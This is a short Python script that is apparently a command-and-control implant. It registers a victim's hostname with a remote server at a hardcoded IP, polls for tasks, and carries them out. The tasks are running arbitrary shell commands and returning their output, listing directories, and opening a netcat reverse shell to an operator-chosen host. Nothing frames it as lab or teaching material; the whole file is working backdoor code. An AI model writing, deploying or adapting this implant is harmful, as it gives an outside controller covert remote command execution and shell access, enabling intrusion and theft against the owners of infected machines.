import subprocess as sp
import threading
import time

import requests as r
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
HOST = "192.168.178.107"
PORT = 10000
SERVICE = "https"
URL = f"{SERVICE}://{HOST}:{PORT}"


def reverse_shell(host: int, port: int, binary: str):
    sp.getoutput(f"netcat -e {binary} {host} {port}")

data = {
    "address": "192.168.178.107",
    "hostname": sp.getoutput("hostname")
}
name = r.post(f"{URL}/connect", json=data, verify=False).text

while True:
    time.sleep(5)
    try:
        tasks = r.get(URL + "/tasks/" + name, verify=False)
    except:
        continue
    print(tasks.status_code)
    tasks = tasks.json()
    for task in tasks:
        if task["type"] in ["rce", "dir", "reverse-shell"]:
            data = {
                "id": task["id"]
            }
            if task["type"] == "rce":
                data["output"] = sp.getoutput(task["args"][0])
            elif task["type"] == "dir":
                data["output"] = sp.getoutput("ls" + task["args"][0])
            elif task["type"] == "reverse-shell":
                data["output"] = "" 
                threading.Thread(target=reverse_shell, kwargs={"host":task['args'][0], "port":task['args'][1], "binary": task['args'][2]}).start()
            res = r.post(URL + "/finish/" + name, json=data, verify=False)

            

        